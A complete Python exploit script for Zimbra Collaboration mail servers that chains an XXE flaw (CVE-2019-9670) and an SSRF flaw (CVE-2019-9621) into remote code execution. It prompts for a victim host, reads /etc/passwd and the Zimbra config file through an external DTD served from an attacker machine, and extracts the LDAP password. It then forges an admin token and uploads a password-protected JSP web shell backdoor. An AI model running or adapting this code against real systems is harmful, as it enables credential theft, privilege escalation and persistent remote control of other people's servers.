import requests
import socket
import sys
import re
import threading
import time
import os

import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)

# HTTP headers for XML reqeusts
xml_request_headers={
                     "Content-Type":"application/xml",
                     "User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
                    }




# Malicious XML payload to read /etc/passwd file.
xxe_payload_to_read_passwd_file = "<!DOCTYPE Autodiscover [<!ELEMENT Autodiscover ANY><!ENTITY target_file SYSTEM 'file:///etc/passwd'>]>" \
                                  "<Autodiscover>" \
                                  "<Request>" \
                                  "<EMailAddress>test@test.test</EMailAddress>" \
                                  "<AcceptableResponseSchema>&target_file;</AcceptableResponseSchema>" \
                                  "</Request>" \
                                  "</Autodiscover>"


# Malicious XML payload to load external DTD file and read zimbra config file.
xxe_payload_to_read_config_file = '<!DOCTYPE Autodiscover [<!ENTITY % dtd SYSTEM "{dtd_file_url}">%dtd;%all;]>' \
                                  '<Autodiscover>' \
                                  '<Request>' \
                                  '<EMailAddress>test@test.test</EMailAddress>' \
                                  '<AcceptableResponseSchema>&target_file;</AcceptableResponseSchema>' \
                                  '</Request>' \
                                  '</Autodiscover>'


# Malicious DTD file to be loaded, Readnig config file.
xxe_dtd_file_contents = '<!ENTITY % file SYSTEM "file:///{zimbra_installation_path}/conf/localconfig.xml">' \
                        '<!ENTITY % start "<![CDATA[">' \
                        '<!ENTITY % end "]]>">' \
                        '<!ENTITY % all "<!ENTITY target_file \'%start;%file;%end;\'>">'


# Zimbra login request body.
login_data = '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">' \
             '<soap:Header>' \
             '<context xmlns="urn:zimbra">' \
             '<userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>' \
             '</context>' \
             '</soap:Header>' \
             '<soap:Body>' \
             '<AuthRequest xmlns="urn:{urn}">' \
             '<account by="adminName">{username}</account>' \
             '<password>{password}</password>' \
             '</AuthRequest>' \
             '</soap:Body>' \
             '</soap:Envelope>'

# Variable to control web server started to serve DTD file.
server_stop=False


# Step1: Scan common Zimbra ports to find the web interface.
def find_zimbra_web_port(target_zimbra_server):
        ports=[443,8443,80,8080] # Zimbra httpd ports
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                sock.connect((target_zimbra_server, port)) # Port is open, return it.
                return str(port)
            except:
                pass
        return None # No port is open.


# Step2:  Try to read /etc/passwd file by exploiting XXE,
# Failure: Not Vulnerable.
# Success: Vulnerable, extract zimbra installation path from /etc/passwd
def exploit_xxe_to_read_passwd_file(target_zimbra_server,target_web_port):                                
    global xxe_payload_to_read_passwd_file

    target_web_port=str(target_web_port)
    protocol = "https"
    if target_web_port == "80" or target_web_port == "8080":
        protocol = "http"
    xxe_vuln_url = protocol + "://" + target_zimbra_server + ":" + target_web_port + "/autodiscover"
    try:
        r = requests.post(xxe_vuln_url, data = xxe_payload_to_read_passwd_file, headers = xml_request_headers, verify = False, timeout = 5, proxies={'http': 'http://localhost:8080', 'https': 'https://localhost:8080'})
        if "root:x" in r.text: # First line of passwd file --> root:x:0:0:root:/root:/bin/bash
            return r.text
        else:
            return False
    except:
        return None


# Step3: Get Zimbra installation path from /etc/passwd (By default it's /opt/zimbra)
def get_zimbra_path_from_passwd(passwd_contents): 
    zimbra_installation_path="/opt/zimbra" # Use /opt/zimbra as default installation path if there isn't any line for "zimbra" user in "passwd" file.
    passwd_lines = passwd_contents.split("\n")
    try: # Read each line of "passwd" file to find zimbra installation path.
        for line in passwd_lines: # Zimbra user's line in /etc/passwd --> zimbra:x:123:123::/opt/zimbra:/bin/bash --> Installation path is /opt/zimbra
            if line.lower().startswith("zimbra:x:"):
                zimbra_installation_path = "/" + line.split(":/")[1].split(":")[0]
    finally:
        return zimbra_installation_path
        
    



# Step4: Start a simple HTTP server to host malicious DTD file.
def start_web_server_to_serve_dtd_file(attacker_port):
    global xxe_dtd_file_contents
    global server_stop
    # HTTP response
    http_response = "HTTP/1.1 200 OK\r\n"
    http_response += "Content-Length: {length}\r\n"
    http_response += "Content-Type: text/xml\r\n"
    http_response += "\r\n"
    http_response += "{body_contents}"
    http_response = http_response.format(body_contents = xxe_dtd_file_contents, length = str(len(xxe_dtd_file_contents)))

    server_sock = socket.socket()
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(('', int(attacker_port))) # Listen on attacker_port to serve DTD file.
    server_sock.listen(1000)
    print("* Waiting for the target server to connect...")
    while not server_stop:
        client_sock, addr = server_sock.accept()
        print("+ Connected!") # Victim server is connected to the server.
        client_sock.recv(0) # HTTP GET request sent by the victim server.
        print("+ Sending malicious DTD file...")
        client_sock.send(http_response.encode()) # Send HTTP response containing DTD file contents to the victim.
        client_sock.close()
        print("+ Done!")
    server_sock.shutdown(socket.SHUT_RDWR) # Close connection.
    server_sock.close()
    print("+ Server shutdown.")



# Step5: Send a reqeust to exploit XXE,load malicous DTD file and read config file.
def xxe_load_dtd_and_read_config_file(target_zimbra_server,target_web_port,malicious_dtd_file_url): 
                                                                                                    
    global xxe_payload_to_read_config_file
    target_web_port=str(target_web_port)
    protocol = "https"
    if target_web_port == "80" or target_web_port == "8080":
        protocol = "http"
    xxe_vuln_url = protocol + "://" + target_zimbra_server + ":" + target_web_port + "/autodiscover"
   
    xxe_payload_to_read_config_file = xxe_payload_to_read_config_file.format(dtd_file_url=malicious_dtd_file_url)
    
    try:
        r = requests.post(xxe_vuln_url, data = xxe_payload_to_read_config_file, headers = xml_request_headers, verify = False, timeout = 5, proxies={'http': 'http://localhost:8080', 'https': 'https://localhost:8080'})
         # Zimbra config file contains "<key" substring.We check response to be sure config file was read.
        if "&lt;key" in r.text: # "&lt;key" is XML-encoded value for "<key"
            return r.text
        else:
            return None
    except:
        return None
       







# Step6 : Extract login credentials of 'zimbra' user from the config file.
def extract_credentials_from_config(config_file_contents):
    '''
    Zimbra config file contents:                                XML-encoded:
    ...
    ...
  <key name="zimbra_user">                                     &lt;key name="zimbra_user"&gt;
    <value>username</value>           --->                         &lt;value&gt;zimbra&lt;/value&gt;
  </key>                                                       &lt;/key&gt;
    ...
    ...
  <key name="zimbra_ldap_password">                            &lt;key name="zimbra_ldap_password"&gt;
    <value>password</value>                                        &lt;value&gt;password&lt;/value&gt;
  </key>                                                       &lt;/key&gt;
    '''
    # Extract username and password from the contetns,return them.
    username_pattern = re.compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
    password_pattern = re.compile(r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
    username = username_pattern.findall(config_file_contents)[0][2]
    password = password_pattern.findall(config_file_contents)[0][2]
    return (username,password)


# Step7 : Use extracted login credentials to get low privileged authentication token.
def get_low_priv_auth_token(target_zimbra_server,target_web_port,username,password): 
    global login_data
    target_web_port=str(target_web_port)
    protocol = "https"
    if target_web_port == "80" or target_web_port == "8080":
        protocol = "http"
    # This endpoint gives us low-privileged authentication token.
    login_url = protocol + "://" + target_zimbra_server + ":" + target_web_port + "/service/soap"
    low_token_login_data = login_data.format(urn = "zimbraAccount", username = username,password = password)
    try:
        r = requests.post(login_url,data=low_token_login_data, headers = xml_request_headers,verify=False, timeout = 5, proxies={'http': 'http://localhost:8080', 'https': 'https://localhost:8080'})
        auth_token_pattern = re.compile(r"<authToken>(.*?)</authToken>")
        low_priv_token = auth_token_pattern.findall(r.text)[0]
        return low_priv_token
    except:
        return None
    
    
    
    

# Step 8 : Exploit authenticated SSRF to get high privileged admin token, needs to send extracted login credentials and low privileged token we get before.
def exploit_ssrf_to_get_admin_token(target_zimbra_server,target_web_port,username,password,low_priv_token):
    global login_data
    target_web_port=str(target_web_port)
    protocol = "https"
    if target_web_port == "80" or target_web_port == "8080":
        protocol = "http"
    # This endpoint is vulnerable to SSRF.
    ssrf_url= protocol + "://" + target_zimbra_server + ":" + target_web_port + "/service/proxy?target=https://127.0.0.1:7071/service/admin/soap"
    high_token_login_data = login_data.format(urn = "zimbraAdmin", username = username,password = password)
    # If we send a request with 'foo:7071' Host header and a valid token in cookie, we can proxy a request to arbitrary targets that is otherwise only accessible to admins.
    xml_request_headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+low_priv_token+";"
    xml_request_headers["Host"]= "foo:7071"
    try:
        r = requests.post(ssrf_url, data = high_token_login_data, headers = xml_request_headers, verify = False, timeout = 5, proxies={'http': 'http://localhost:8080', 'https': 'https://localhost:8080'})
        auth_token_pattern = re.compile(r"<authToken>(.*?)</authToken>") # Extract admin token from the reponse, return it.
        admin_token = auth_token_pattern.findall(r.text)[0]
        return admin_token.strip()
    except:
        return None



# Step 9 : Set admin token as cookie value to upload Web shell file to the /downloads/ directory.
# Success: RCE
def upload_jsp_shell(target_zimbra_server,target_web_port,admin_token,shell_filename,shell_contents):

    target_web_port=str(target_web_port)
    protocol = "https"
    if target_web_port == "80" or target_web_port == "8080":
        protocol = "http"
    # File upload endpoint
    upload_url= protocol + "://" + target_zimbra_server + ":" + target_web_port + "/service/extension/clientUploader/upload"
    # File to upload.
    file_input = {'filename1':(None,"whocare",None),
                  'clientFile':(shell_filename,shell_contents,"text/plain"),
                  'requestId':(None,"12",None),
                 }
    # Request headers, ZM_ADMIN_AUTH_TOKEN cookie is needed.
    upload_headers = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                      "Cookie":"ZM_ADMIN_AUTH_TOKEN="+admin_token+";"
                     }

    try:
        r = requests.post(upload_url,files=file_input,headers=upload_headers,verify=False, timeout = 5, proxies={'http': 'http://localhost:8080', 'https': 'https://localhost:8080'})
        

        if "upload failed" in r.text.lower(): # Upload failed.
            print("- Failed to upload the file due to unknown error!")
            print("- Error message:")
            print(r.text[:300]+"...")
            return False
        else: # Web shell file was uploaded successfully.
            print("+ Web shell file was uploaded successfully!")
            print("+ Web shell URL:")
            web_shell_url = protocol + "://" + target_zimbra_server + ":" + target_web_port+"/downloads/"+shell_filename
            print(web_shell_url)
            print("+ You may need to set this cookie header to access the uploaded web shell:")
            print("Cookie: "+upload_headers["Cookie"])
            return web_shell_url # Return uploaded web shell URL
    except Exception as e: # Request error occured.
        print(str(e))
        return None
        
# Step 0: Main function.
def main(): 
    global xxe_dtd_file_contents
    global server_stop
    print("")
    print("Exploit code for:")
    print("Zimbra Collaboration Autodiscover Servlet\nXXE (CVE-2019-9670) and ProxyServlet SSRF (CVE-2019-9621) --> RCE")
    print("")
    print("")
    target=input("Enter your target server (e.g. mail.victim.com): ")
    target=target.strip()

    print("* Scanning common HTTP ports to find Zimbra Web interface...")
    target_web_port=find_zimbra_web_port(target) # Find open Zimbra web port.
    if target_web_port is None:
           print("- All Zimbra Web interface default ports are closed.")
           sys.exit()
    else:
           print("+ Using port " + str(target_web_port) + "...")

    choice = None
    username,password = None,None
    while choice is None: # If we have username:pasword of zimrba user,We don't need to exploit XXE vulnerability.
        choice = input("* Do you have username:password for zimrba user? (yes/no): ").lower()
        if choice == "yes":
            username = input("* Enter zimbra username: ")
            password = input("* Enter zimbra password: ")
        elif choice == "no": # We don't have username:password, Exploit XXE to read them from Zimrba config file.
            print("* Checking for XXE vulnerability (CVE-2019-9670)...") # Check vulnerability by reading "/etc/passwd" file.
            passwd_contents=None
            for i in range(0,10):
                passwd_contents=exploit_xxe_to_read_passwd_file(target,target_web_port)
                if passwd_contents is None:
                    print("- Try "+str(i+1)+ " failed.")

                else:
                    break
            if passwd_contents is False or passwd_contents is None: # Could not read /etc/passwd, Not vulnerable or firewall blocked the reqeust!
                print("- Failed to read /etc/passwd, maybe not vulnerable!")
                sys.exit()

            print("+ Vulnerable!") # Server is vulnerable, find Zimbra installation path.
            zimbra_path = get_zimbra_path_from_passwd(passwd_contents)
            # We need to load an external DTD file to read the config file.
            # Firewall may block external connections.
            xxe_dtd_file_contents = xxe_dtd_file_contents.format(zimbra_installation_path=zimbra_path)
            malicious_dtd_file_url=""
            print("* It's time to exploit XXE by loading the malicious DTD file.")
            print("* You need to host the malicous DTD file on a server.")
            print("* What do you want to do?")
            print("* 1- Create DTD file and host it on the current machine by running simple XXE web server server.")
            print("* 2- Create DTD file and host it on an external web server you own.")
            attacker_server = port_to_listen = web_server_thread = None
            choice=None
            while choice is None:
                choice = input("Enter your choice number (1 or 2): ")
    
                if choice == "1":
                    attacker_server = input("Enter your IP address/Domain name to host DTD file (e.g. attacker.com): ")
                    port_to_listen = input("Enter port to listen to host DTD file (e.g. 1337): ")
                    malicious_dtd_file_url="http://" + attacker_server + ":" + port_to_listen
                    port_to_listen=int(port_to_listen)

                elif choice == "2":
                    f = open("xxe.dtd","w")
                    f.write(xxe_dtd_file_contents)
                    f.close()
                    print("+ DTD file xxe.dtd was saved to the current directory,")
                    print("  upload it on your server.")
                    malicious_dtd_file_url = input("Enter URL to the uploaded DTD file on your web server: ")
                    malicious_dtd_file_url=malicious_dtd_file_url.strip()
                else:
                    choice=None




            zimbra_config_contents=None

            if choice == "1":
                web_server_thread = threading.Thread(target=start_web_server_to_serve_dtd_file, args = (port_to_listen,))
                web_server_thread.daemon = True
                web_server_thread.start()
                time.sleep(1)
            for i in range(0,20):

                print("* Sending XXE request to load DTD file...") # Send XXE request to load external DTD file.
                resp = xxe_load_dtd_and_read_config_file(target,target_web_port,malicious_dtd_file_url)
                if resp is not None:
                    zimbra_config_contents = resp
                    server_stop = True
                    break
                else:
                    print("- Try "+ str(i + 1) + " failed.")

    
            if zimbra_config_contents is None:
                print("- Failed to exploit XXE to read config file.")
                server_stop = True
                sys.exit()


            print("+ Done!")
            print("+ XXE was successfully exploited to read Zimbra config file.")
            print("* Extracting zimbra user credentials...")
            username,password = extract_credentials_from_config(zimbra_config_contents)
            print("+ Username: "+username)
            print("+ Password: "+password)

        else:
            choice = None

    
    print("* Logging in to get low privilege authentication token for zimbra user...")
    low_priv_auth_token = None
    for i in range(0,10):
        low_priv_auth_token = get_low_priv_auth_token(target,target_web_port,username,password)
        if low_priv_auth_token is None:
            print("- Try "+str(i+1)+ " failed.")
        else:
            break
    if low_priv_auth_token is None:
        print("- Failed to get low privilege authentication token.")
        sys.exit()


    print("+ Low privilege authentication token:")
    print(low_priv_auth_token)

    print("* It's time to escalate privileges!")
    print("  zimbraAccount(low privileges) --> zimbraAdmin(high privileges)")
    print("* Exploiting SSRF vulnerability (CVE-2019-9621) to get high privileged admin token...")
    admin_token = None
    for i in range(0,10): # Exploit SSRF vulnerability to get admin token.
        admin_token = exploit_ssrf_to_get_admin_token(target,target_web_port,username,password,low_priv_auth_token)
        if admin_token is None:
            print("- Try "+str(i+1)+ " failed.")
        else:
            break
    if admin_token is None:
        print("- Failed to get admin authentication token.")
        sys.exit()
    
    print("+ High privileged admin token:")
    print(admin_token)
    print("+ Privilege Escalation was successful!")
    print("")
    choice=None                 # Now we have admin access on the server, We could upload malicious JSP files to get RCE :)
    while choice is None:       # JShell is a post-exploitation backdoor for JSP platform. Backdoor file is written in JSP and controller is written in Python3
        options = "* Options:\n" \
                  "   1- Generate and Upload JShell JSP backdoor\n" \
                  "   2- Upload you own file\n" \
                  "   3- Connect to existing JShell JSP backdoor\n" \
                  "   4- Do nothing and exit\n"
        print(options)
        print("")
        choice=input("* What do you want to do? (1,2,3,4): ")

        if choice == "1":
            jshell_is_loaded = False
            while jshell_is_loaded is False:

                try: # Load JShell module from current directroy.
                    from jshell_proxied import JShell
                    jshell_is_loaded = True
                except:
                    print("- Failed to load jshell module.")
                    print("  Be sure jshell.py file is in the current directory.")
                    input("  Press Enter key to try again...")

            password = ""
            while password == "":
                password = input("* Enter your password to protect your web shell backdoor: ")
                if password.strip() == "":
                    password = ""
            # generate backdoor JSP file.
            shell_file_contents = JShell(webshell_password=password).generate_webshell_file()

            web_shell_filename = ""
            while web_shell_filename == "":
                web_shell_filename = input("* Enter file name for web shell backdoor(e.g. shell.jsp): ")
                if not web_shell_filename.lower().endswith(".jsp"):
                    print("- File name must end with .jsp extension!")
                    web_shell_filename = ""


            for i in range(0,10):
                print("* Uploading "+web_shell_filename+" web shell...")
                web_shell_url = upload_jsp_shell(target,target_web_port,admin_token,web_shell_filename,shell_file_contents)
                if web_shell_url is None: # Connection error, Try again.
                    print("- Try "+str(i+1)+ " failed.")
                elif web_shell_url is False: # Upload failed.
                    sys.exit()
                else:
                    # We need admin token to access uploaded web shell. ZM_ADMIN_AUTH_TOKEN cookie is required.
                    web_shell_cookie = "ZM_ADMIN_AUTH_TOKEN="+admin_token+";"
                    print("Starting JShell handler to execute commands...")
                    JShell(webshell_url=web_shell_url,webshell_password=password,cookie=web_shell_cookie).connect_to_webshell()
                    break

    
        elif choice=="2":
            web_shell_filename=None
            while web_shell_filename is None:
                web_shell_path=input("  Enter path to the web shell file on your system(e.g. shell.jsp):")
                try:
                    web_shell_filename = os.path.basename(web_shell_path)
                    f=open(web_shell_path,"r")
                    shell_file_contents=f.read()
                    f.close()
                    for i in range(0,10):
                        print("* Uploading "+web_shell_filename+" web shell...")
                        result=upload_jsp_shell(target,target_web_port,admin_token,web_shell_filename,shell_file_contents)
                        if result is None:
                            print("- Try "+str(i+1)+ " failed.")
                        else:
                            break






                except Exception as e:
                    web_shell_filename=None
                    print(str(e))

        elif choice=="3": # Connect to the existing JShell backdoor uploaded on victim Zimbra server.
            jshell_is_loaded = False
            while jshell_is_loaded is False:

                try:
                    from jshell import JShell
                    jshell_is_loaded = True
                except:
                    print("- Failed to load jshell module.")
                    print("  Be sure jshell.py file is in the current directory.")
                    input("  Press Enter key to try again...")

            web_shell_url = None
            while web_shell_url is None:
                web_shell_url=input("  Enter uploaded Jshell backdoor URL (e.g. http://mail.victim.com/downloads/shell.jsp): ")
            password = None
            while password is None:
                password = input("  Enter your password to connect to JShell backdoor: ")

            print("Connecting to JShell web backdoor...")
            web_shell_cookie = "ZM_ADMIN_AUTH_TOKEN="+admin_token+";"
            JShell(webshell_url=web_shell_url,webshell_password=password,cookie=web_shell_cookie).connect_to_webshell()
        elif choice=="4":
            print("+ Ok")
            sys.exit()
        else:
            choice=None



if __name__ == '__main__':
    main()

